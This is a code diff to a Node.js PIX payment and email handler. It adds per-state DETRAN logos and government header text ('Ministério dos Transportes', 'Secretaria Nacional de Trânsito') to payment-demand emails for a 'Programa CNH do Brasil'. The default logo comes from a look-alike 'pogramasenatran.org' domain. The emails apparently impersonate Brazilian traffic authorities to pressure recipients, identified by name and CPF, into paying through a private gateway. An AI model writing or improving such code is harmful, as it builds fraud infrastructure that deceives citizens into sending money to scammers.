@@ -8,6 +8,36 @@ const QRCode = require("qrcode");
 const BASE_URL = process.env.BLACKCAT_BASE_URL || "https://api.blackcatpagamentos.online/api";
 const UTMIFY_API_URL = "https://api.utmify.com.br/api-credentials/orders";
 
+const DETRAN_BADGE_BY_UF = {
+  AC: "https://www.agencia.ac.gov.br/wp-content/uploads/2019/07/Nova-Logo-Detran-Acre-2019-2-800x416.png",
+  AL: "https://seeklogo.com/images/D/detran-alagoas-logo-C0D07878CA-seeklogo.com.png",
+  AP: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/Detran-Amapa-ap-exame-toxicologico.jpg",
+  AM: "https://apstatic.prodam.am.gov.br/images/detran/logo-detran-horizontal.png",
+  BA: "https://images.seeklogo.com/logo-png/39/1/detran-bahia-logo-png_seeklogo-395407.png",
+  CE: "https://www.detran.ce.gov.br/wp-content/uploads/2018/04/logo_detran_2018.png",
+  DF: "https://zpy-customer-communication-cms-strapi-images-2.s3.amazonaws.com/DETRAN_DF_378eeacd03.webp",
+  ES: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbFOyL7H4mp0igBsJUKg3y4m_7mg9xkqXPnQ&s",
+  GO: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTmmhmirDeoyas3iEHwHapMrQ3vIHa0ivq3wQ&s",
+  MA: "https://seeklogo.com/images/D/detran-maranhao-logo-4F04A57787-seeklogo.com.png",
+  MT: "https://portalcredenciamento.detran.mt.gov.br/815ed82f649be4cc8df5e9e024e23482.png",
+  MS: "https://d1yjjnpx0p53s8.cloudfront.net/styles/logo-thumbnail/s3/082015/detranms_0.png?itok=oDYhYuLp",
+  MG: "https://www.camarauberlandia.mg.gov.br/DETRANMG.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
+  PA: "https://www.roservalramos.com.br/wp-content/uploads/2020/01/detran-pa-consulta.jpg",
+  PB: "https://www.segundaviadetudo.com.br/wp-content/uploads/2020/07/Logo-Detran-PB.png",
+  PR: "https://reciclagemcnhonline.com.br/wp-content/uploads/2024/08/Detran-PR-600x170.png",
+  PE: "https://www.detran.pe.gov.br/images/FOTO%202022/Design%20sem%20nome%204.jpg",
+  PI: "https://conteudo.consultapelaplaca.com.br/wp-content/uploads/2024/10/Detran-PI-IPVA-PI-2024-1.jpg",
+  RJ: "https://odia.ig.com.br/_midias/jpg/2020/07/27/1140x632/1_detran_rj_2020_1280x720-18488499.jpg",
+  RN: "https://www.novacruz.rn.leg.br/detran.png/image_preview",
+  RS: "https://yt3.googleusercontent.com/JMoN0dwOBMHH6MLzGDD9m9QKYTTXKNqSeZHKwO46Zg006Nl-Yf4Ug17edHRcVDPQUYewi03ApQ=s900-c-k-c0x00ffffff-no-rj",
+  RO: "https://portaleducacional.detran.ro.gov.br/Content/images/LogoDetranGrandel.png",
+  RR: "https://www.detran.rr.gov.br/wp-content/uploads/2021/09/logotipo-detran-rr.png",
+  SC: "https://servicos.detran.sc.gov.br/images/og-image.png",
+  SP: "https://grandesnomesdapropaganda.com.br/wp-content/uploads/2014/09/Logo-detran-SP.jpg",
+  SE: "https://images.seeklogo.com/logo-png/55/1/detran-se-logo-png_seeklogo-550201.png",
+  TO: "https://www.exametoxicologico.com.br/wp-content/uploads/2019/03/detran-to-exame-toxicologico.jpg",
+};
+
 function formatUtcDate(date) {
   const iso = new Date(date).toISOString();
   return iso.replace("T", " ").substring(0, 19);
@@ -54,17 +84,20 @@ async function getMailTransporter() {
   return mailTransporterPromise;
 }
 
-function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran }) {
+function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl }) {
   const amount = formatCurrencyBRL(amountCents);
   const safeTitle = title || "Pagamento PIX";
   const safeName = nome || "Olá";
   const safeTx = transactionId ? `Transação: ${transactionId}` : "";
   const safeCpf = cpf ? String(cpf).replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
 
-  const logoUrl = process.env.PIX_EMAIL_LOGO_URL || "https://popseal.vercel.app/cnhzinlogo.png";
+  const logoUrl = process.env.PIX_EMAIL_LOGO_URL || "https://assets.pogramasenatran.org/govbr-logo.png";
   const headerTitle = process.env.PIX_EMAIL_HEADER_TITLE || "Programa CNH do Brasil";
   const headerSubtitle = process.env.PIX_EMAIL_HEADER_SUBTITLE || "Inscrição ativa";
-  const headerRightLogo = process.env.PIX_EMAIL_HEADER_RIGHT_LOGO || "https://assets.pogramasenatran.org/govbr-logo.png";
+  const headerRightLogo = process.env.PIX_EMAIL_HEADER_RIGHT_LOGO || "";
+  const headerRightBadge = detranBadgeUrl || process.env.PIX_EMAIL_HEADER_BADGE_URL || "";
+  const headerLine1 = process.env.PIX_EMAIL_HEADER_LINE1 || "Ministério dos Transportes";
+  const headerLine2 = process.env.PIX_EMAIL_HEADER_LINE2 || "Secretaria Nacional de Trânsito";
   const buttonLabel = process.env.PIX_EMAIL_BUTTON_LABEL || "REALIZAR PAGAMENTO";
   const detranLabel = detran || process.env.PIX_EMAIL_DETRAN_LABEL || "DETRAN/AC";
   const expiresText = process.env.PIX_EMAIL_EXPIRES_TEXT || "Expira em 24 horas";
@@ -83,25 +116,53 @@ function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transact
               <td align="center">
                 <table role="presentation" cellpadding="0" cellspacing="0" width="520" style="max-width:520px; width:100%; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 8px 24px rgba(15, 23, 42, 0.08);">
             <tr>
-              <td style="background:#0b2a57; padding:18px 20px;">
+              <td style="background:#0b2a57; padding:0;">
                 <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
                   <tr>
-                    <td style="text-align:left;">
-                      <img src="${logoUrl}" alt="Logo" style="max-height:36px; display:block;" />
-                    </td>
-                    <td style="text-align:right;">
-                      ${headerRightLogo ? `<img src="${headerRightLogo}" alt="" style="max-height:28px; display:inline-block;" />` : ""}
+                    <td style="background:#0b2a57; padding:0;">
+                      <table role="presentation" width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                          <td style="background:#1ea35a; width:22%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
+                          <td style="background:#f7c325; width:22%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
+                          <td style="background:#0b2a57; width:56%; height:4px; font-size:0; line-height:0;">&nbsp;</td>
+                        </tr>
+                      </table>
                     </td>
                   </tr>
                 </table>
-                <div style="color:#ffffff; font-weight:700; font-size:16px; margin-top:10px;">${headerTitle}</div>
-                <div style="color:#9fb5d6; font-size:12px; margin-top:2px;">${headerSubtitle}</div>
+                <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="padding:14px 20px 16px;">
+                  <tr>
+                    <td style="text-align:left; width:40%; vertical-align:top;">
+                      <table role="presentation" cellpadding="0" cellspacing="0">
+                        <tr>
+                          <td style="padding-right:8px;">
+                            <img src="${logoUrl}" alt="Logo" style="max-height:28px; display:block;" />
+                          </td>
+                          <td style="border-left:1px solid rgba(255,255,255,0.25); padding-left:8px;">
+                            <div style="color:#ffffff; font-size:10px; font-weight:600;">${headerLine1}</div>
+                            <div style="color:#cfe0ff; font-size:9px; margin-top:2px;">${headerLine2}</div>
+                          </td>
+                        </tr>
+                      </table>
+                    </td>
+                    <td style="text-align:right; vertical-align:top;">
+                      ${headerRightBadge ? `
+                        <div style=\"display:inline-block; background:#ffffff; padding:4px 6px; border-radius:6px;\">
+                          <img src=\"${headerRightBadge}\" alt=\"\" style=\"max-height:26px; display:block;\" />
+                        </div>
+                      ` : (headerRightLogo ? `<img src="${headerRightLogo}" alt="" style="max-height:28px; display:inline-block;" />` : "")}
+                    </td>
+                  </tr>
+                </table>
+                <div style="color:#ffffff; font-weight:700; font-size:16px; padding:0 20px 2px;">Programa <span style=\"background:#f7c325; color:#0b2a57; padding:2px 4px; border-radius:3px;\">CNH</span> do Brasil</div>
+                <div style="color:#8dd39c; font-size:11px; padding:0 20px 14px;">• ${headerSubtitle}</div>
               </td>
             </tr>
             <tr>
               <td style="padding:16px 20px 0;">
                 <div style="background:#fff5d6; border:1px solid #ffe1a3; color:#6b4b00; padding:10px 12px; border-radius:8px; font-size:12px;">
-                  <strong>⚠ Ação necessária, ${safeName}.</strong><br />
+                  <span style="display:inline-block; width:18px; height:18px; border-radius:50%; background:#f59e0b; color:#fff; text-align:center; line-height:18px; font-weight:700; margin-right:6px;">!</span>
+                  <strong>Ação necessária, ${safeName}.</strong><br />
                   Sua inscrição aguarda confirmação de pagamento.
                 </div>
               </td>
@@ -187,7 +248,7 @@ function buildPixEmailHtml({ nome, pixCode, qrCode, amountCents, title, transact
   `;
 }
 
-async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran }) {
+async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, transactionId, cpf, detran, detranBadgeUrl }) {
   const transporter = await getMailTransporter();
   if (!to) {
     console.warn("[PAYMENT] Email PIX não enviado: destinatário vazio");
@@ -211,6 +272,7 @@ async function sendPixEmail({ to, nome, pixCode, qrCode, amountCents, title, tra
     transactionId,
     cpf,
     detran,
+    detranBadgeUrl,
   });
 
   const info = await transporter.sendMail({
@@ -428,6 +490,11 @@ async function handlePaymentRequest(req, res) {
       bodyData.detran ||
       bodyData.detran_label ||
       (bodyData.uf ? `DETRAN/${bodyData.uf}` : "");
+    const detranUf = String(bodyData.uf || detranFromBody || "")
+      .replace("DETRAN/", "")
+      .trim()
+      .toUpperCase();
+    const detranBadgeUrl = detranUf ? DETRAN_BADGE_BY_UF[detranUf] || "" : "";
     const tracking = (() => {
       if (trackingFromBody && typeof trackingFromBody === "object" && !Array.isArray(trackingFromBody)) {
         const utm = typeof trackingFromBody.utm === "object" && trackingFromBody.utm ? trackingFromBody.utm : {};
@@ -636,6 +703,7 @@ async function handlePaymentRequest(req, res) {
         transactionId: String(tx),
         cpf: customer.taxId || "",
         detran: detranFromBody || "",
+        detranBadgeUrl,
       });
     } catch (mailError) {
       console.error("[PAYMENT] Falha ao enviar email PIX:", mailError.message || mailError);
